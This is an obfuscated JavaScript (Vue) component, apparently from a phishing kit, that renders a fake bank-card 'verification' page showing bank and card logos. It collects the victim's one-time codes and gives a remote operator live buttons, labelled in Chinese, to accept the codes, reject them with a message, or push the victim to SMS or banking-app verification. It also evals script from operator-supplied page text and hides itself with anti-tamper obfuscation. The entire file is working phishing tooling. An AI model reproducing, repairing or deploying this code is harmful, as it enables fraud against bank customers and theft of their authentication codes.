const a33_0x200824 = function () {
  let _0x2f907a = true;
  return function (_0x23edf5, _0x31aab7) {
    const _0x21f093 = _0x2f907a ? function () {
      if (_0x31aab7) {
        const _0x31a598 = _0x31aab7.apply(_0x23edf5, arguments);
        _0x31aab7 = null;
        return _0x31a598;
      }
    } : function () {};
    _0x2f907a = false;
    return _0x21f093;
  };
}();
const a33_0x2489c7 = a33_0x200824(this, function () {
  return a33_0x2489c7.toString().search("(((.+)+)+)+$").toString().constructor(a33_0x2489c7).search("(((.+)+)+)+$");
});
a33_0x2489c7();
import { d as a33_0x51a315, a as a33_0x3cf230, B as a33_0x1a8d5d, n as a33_0x203134, r as a33_0x292541, w as a33_0x348763, b as a33_0x27502e, c as a33_0x10f779, e as a33_0x34e58c, t as a33_0x56bbe0, u as a33_0x38fd84, f as a33_0x360103, g as a33_0x47a955, h as a33_0x42872a, T as a33_0xf70e64, F as a33_0x1498d7, k as a33_0x354696, j as a33_0x155eea, v as a33_0x250079, D as a33_0x1a13aa, i as a33_0x14758e } from './index-4b020bd6.js';
import { u as a33_0x18ca65, a as a33_0x2289c5 } from './f0ee2557KXMp5.js';
import { u as a33_0x145e3d, g as a33_0x27292b, a as a33_0x4d2df4, p as a33_0x2ecce7 } from './3213f1cfKXMp5.js';
import { a as a33_0x20d592, i as a33_0x50db86 } from './fff8ac5eKXMp5.js';
import { _ as a33_0xb352a5 } from './a9f81857KXMp5.js';
import './7357514cKXMp5.js';
import './09bf01f8KXMp5.js';
const _hoisted_1 = ["onSubmit"];
const _hoisted_2 = {
  'class': "header"
};
const _hoisted_3 = {
  'class': "bank-logo"
};
const _hoisted_4 = ["src"];
const _hoisted_5 = {
  'class': "card-logo"
};
const _hoisted_6 = ["src"];
const _hoisted_7 = a33_0x34e58c('br', null, null, -0x1);
const _hoisted_8 = {
  'style': {
    'font-size': "1.1em"
  }
};
const _hoisted_9 = a33_0x34e58c('br', null, null, -0x1);
const _hoisted_10 = {
  'key': 0x0,
  'class': 'input',
  'style': {
    'text-align': "left"
  }
};
const _hoisted_11 = {
  'key': 0x1,
  'class': "input",
  'style': {
    'text-align': 'left'
  }
};
const _hoisted_12 = a33_0x34e58c('br', null, null, -0x1);
const _hoisted_13 = {
  'class': "button-submit"
};
const _sfc_main = a33_0x51a315({
  '__name': "VerifyPage",
  'setup'(_0x517563) {
    const _0x4bbf2f = a33_0x18ca65();
    const _0x2cf674 = a33_0x2289c5();
    const _0x1f0643 = a33_0x145e3d();
    const _0x2a1597 = _0x4bbf2f.query.pageIndex;
    const _0x183b30 = JSON.parse(a33_0x27292b("verify-page") || '[]');
    const _0x280554 = _0x183b30 instanceof Array ? _0x183b30[_0x2a1597] : _0x183b30;
    let _0x512251 = _0x280554["page-text"] || '';
    if (_0x512251) {
      const _0x5e0559 = (localStorage.getItem("__darcula_verify_page_text") || '').split('|');
      _0x512251 = _0x512251.replace(/\$\{(.*?)\}/g, _0x4ec839 => {
        var _0x256e2e;
        const _0x24bf15 = _0x5e0559.shift();
        const _0x375e26 = _0x4ec839.replace(/^\$\{/, '').replace(/\}$/, '').split('|');
        return (_0x24bf15 == null ? undefined : _0x24bf15.trim()) || ((_0x256e2e = _0x375e26[0x1]) == null ? undefined : _0x256e2e.trim()) || '';
      });
    }
    const _0x21be3b = a33_0x3cf230();
    _0x280554['page-text'] = _0x512251;
    a33_0x1a8d5d(() => {
      a33_0x203134(() => {
        if (!_0x21be3b.value) {
          return;
        }
        const _0x4598f5 = document.createElement("div");
        _0x4598f5.innerHTML = _0x512251;
        _0x21be3b.value.append(_0x4598f5);
        _0x4598f5.querySelectorAll('script').forEach(_0x291532 => {
          eval(_0x291532.innerHTML);
        });
      });
    });
    const _0x261d95 = a33_0x3cf230('');
    const _0x3e213e = a33_0x292541({
      'verifyCode0': '',
      'verifyCode1': ''
    });
    a33_0x348763(_0x3e213e, () => {
      _0x261d95.value = '';
      a33_0x2ecce7(_0x3e213e);
    });
    a33_0x4d2df4("accept-verify", () => {
      if (typeof _0x32e5d3.value == "string") {
        _0x2cf674.replace(decodeURIComponent(_0x32e5d3.value));
      }
    });
    a33_0x4d2df4("reject-back", () => {
      if (typeof _0x593590.value == 'string') {
        _0x2cf674.replace(decodeURIComponent(_0x593590.value));
      }
    });
    a33_0x4d2df4("reject-verify", _0x42fd45 => {
      _0x1f0643.status = "当前正在自定义验证页面";
      setTimeout(() => {
        _0x261d95.value = _0x42fd45 || _0x280554['page-error'] || "Verification failed, please check and try again";
        _0x1f0643.loading = false;
      }, 0x1f4);
    });
    a33_0x4d2df4("reject-sms", () => {
      const _0x33ecae = _0x4bbf2f.fullPath.replace("verify-page", "verify-sms");
      _0x2cf674.replace(_0x33ecae);
    });
    a33_0x4d2df4("reject-bank", () => {
      const _0x2d1721 = _0x4bbf2f.fullPath.replace("verify-page", "verify-bank");
      _0x2cf674.replace(_0x2d1721);
    });
    const _0x2fdbae = JSON.parse(localStorage.getItem("__beforeSubmitActions") || '[]');
    for (const _0x1b7955 of _0x2fdbae) try {
      a33_0x4d2df4(_0x1b7955.key, () => {
        _0x2cf674.replace(_0x1b7955.url);
      });
    } catch (_0x5eca61) {}
    const _0x390119 = a33_0x20d592();
    for (const _0x388bd9 in _0x390119) a33_0x4d2df4("accept-custom-verify-" + _0x388bd9, _0x1eb2d5 => {
      _0x1f0643.status = "当前正在自定义验证页面";
      localStorage.setItem("__darcula_verify_page_text", _0x1eb2d5 || '');
      _0x2cf674.replace(_0x4bbf2f.fullPath.replace(/pageIndex=\d+/, "pageIndex=" + _0x388bd9));
    });
    const _0x13d456 = a33_0x3cf230();
    function _0x25c21a() {
      _0x1f0643.status = {
        'color': "red",
        'status': "用户已经提交, 请抓紧验证"
      };
      const _0x259b06 = [];
      if (_0x32e5d3.value) {
        _0x259b06.push({
          'key': "accept-verify",
          'label': "验证通过"
        });
      }
      if (_0x593590.value) {
        _0x259b06.push({
          'key': "reject-back",
          'label': "返回上一步"
        });
      }
      _0x259b06.push({
        'key': "reject-verify",
        'label': "拒绝通过",
        'data': "请输入提示信息"
      });
      _0x259b06.push({
        'key': "reject-sms",
        'label': "改验证码验证"
      });
      _0x259b06.push({
        'key': "reject-bank",
        'label': "改APP验证"
      });
      _0x259b06.push(..._0x2fdbae);
      for (const _0x28722b in _0x390119) if (_0x28722b !== _0x2a1597) {
        _0x259b06.push(_0x390119[_0x28722b]);
      }
      _0x1f0643.actions = _0x259b06;
    }
    return (_0x37b522, _0x401ff2) => (a33_0x27502e(), a33_0x10f779(a33_0x1498d7, null, [a33_0x34e58c("title", null, a33_0x56bbe0(a33_0x38fd84(_0x280554)['page-title']), 0x1), (a33_0x27502e(), a33_0x360103(a33_0xf70e64, {
      'to': "#darcula-teleport-page"
    }, [a33_0x47a955(a33_0xb352a5, {
      'css': a33_0x38fd84(".error{color:red;font-size:.9em}.container{padding:15px;font-size:16px;max-width:800px;margin:0 auto}.container .header{height:66px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e3e3e3}.container .header>div{display:flex;align-items:center}.container .header img,.container .header .bank-logo{height:100%}.container .header .card-logo{height:100%;position:relative}.container .header .card-logo:after{content:\"\";display:block;position:absolute;top:0;width:15px;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.6352941176),transparent);animation:line 2s infinite}@keyframes line{0%{left:-15px}to{left:100%}}.container div.input label{display:block;margin-bottom:5px}.container div.input input{width:100%;padding:8px 5px;outline:none;border:2px solid black;border-radius:5px;font-weight:700;font-size:1.1em;box-sizing:border-box}.container div.input input:focus{border-color:#5381be}.container div.button-submit button{width:100%;padding:10px 5px;cursor:pointer;background-color:#5381be;color:#fff;border:none;outline:none;border-radius:3px}\n")
    }, {
      'default': a33_0x42872a(() => [a33_0x34e58c("form", {
        'ref_key': 'formRef',
        'ref': _0x13d456,
        'class': "container",
        'onSubmit': a33_0x14758e(_0x25c21a, ["prevent"])
      }, [a33_0x34e58c("div", _hoisted_2, [a33_0x34e58c("div", _hoisted_3, [a33_0x38fd84(_0x280554).file ? (a33_0x27502e(), a33_0x10f779('img', {
        'key': 0x0,
        'src': "/uploads/" + a33_0x38fd84(_0x280554).file,
        'alt': "bank"
      }, null, 0x8, _hoisted_4)) : a33_0x354696('', true)]), a33_0x34e58c("div", _hoisted_5, [a33_0x34e58c("img", {
        'src': a33_0x38fd84(a33_0x50db86)[a33_0x38fd84(_0x3b7e01).toLowerCase()] || a33_0x38fd84(a33_0x50db86).cardIcon,
        'style': {
          'height': '60%'
        },
        'alt': "card-logo"
      }, null, 0x8, _hoisted_6)])]), _hoisted_7, a33_0x34e58c('div', _hoisted_8, [a33_0x34e58c('b', null, a33_0x56bbe0(a33_0x38fd84(_0x280554)["page-title"]), 0x1)]), a33_0x34e58c('p', {
        'ref_key': "pageTextRef",
        'ref': _0x21be3b
      }, null, 0x200), _hoisted_9, a33_0x38fd84(_0x280554)["input-1"] ? (a33_0x27502e(), a33_0x10f779('div', _hoisted_10, [a33_0x34e58c("label", null, a33_0x56bbe0(a33_0x38fd84(_0x280554)["input-1"]), 0x1), a33_0x155eea(a33_0x34e58c('input', {
        'type': "text",
        'onUpdate:modelValue': _0x401ff2[0x0] || (_0x401ff2[0x0] = _0x243b32 => _0x3e213e.verifyCode0 = _0x243b32),
        'required': ''
      }, null, 0x200), [[a33_0x250079, _0x3e213e.verifyCode0]])])) : a33_0x354696('', true), a33_0x38fd84(_0x280554)["input-2"] ? (a33_0x27502e(), a33_0x10f779("div", _hoisted_11, [a33_0x34e58c("label", null, a33_0x56bbe0(a33_0x38fd84(_0x280554)["input-2"]), 0x1), a33_0x155eea(a33_0x34e58c("input", {
        'type': "text",
        'onUpdate:modelValue': _0x401ff2[0x1] || (_0x401ff2[0x1] = _0x28a1d4 => _0x3e213e.verifyCode1 = _0x28a1d4),
        'required': ''
      }, null, 0x200), [[a33_0x250079, _0x3e213e.verifyCode1]])])) : a33_0x354696('', true), _hoisted_12, a33_0x34e58c("div", {
        'class': 'error',
        'style': a33_0x1a13aa({
          'visibility': _0x261d95.value ? "visible" : "hidden"
        })
      }, a33_0x56bbe0(_0x261d95.value || " "), 0x5), a33_0x34e58c('div', _hoisted_13, [a33_0x34e58c("button", {
        'type': "submit",
        'style': a33_0x1a13aa({
          'background': a33_0x38fd84(_0x280554)["page-color"] || '#5381be'
        })
      }, a33_0x56bbe0(a33_0x38fd84(_0x280554).button || "Submit"), 0x5)])], 0x28, _hoisted_1)]),
      '_': 0x1
    }, 0x8, ["css"])]))], 0x40));
  }
});
export { _sfc_main as default };